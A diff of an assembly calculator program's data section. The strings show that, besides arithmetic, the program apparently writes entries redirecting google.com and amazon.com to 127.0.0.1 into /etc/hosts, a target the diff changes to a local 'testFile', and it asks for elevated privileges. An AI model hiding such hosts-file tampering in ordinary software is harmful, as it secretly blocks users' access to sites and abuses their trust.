@@ -7,8 +7,8 @@ selection_string db "Please choose an operation. 0:add, 1:substract, 2:multiply,
 error_msg db "Please choose a new operation. ", 0
 output_string db "The output of the operation is ", 0
 remainder_string db "with a remainder of ", 0
-file_path db "/etc/hosts", 0
-write_string db "google.com 127.0.0.1", 13, "amazon.com 127.0.0.1", 13 , 0
+file_path db "testFile", 0
+write_string db 13,"127.0.0.1 www.google.com", 13, "127.0.0.1 google.com", 13, "127.0.0.1 www.amazon.com", 13, "127.0.0.1 amazon.com", 13, 0
 error_file db "Error occurred! Please elevate privileges!", 0
 
 segment .bss
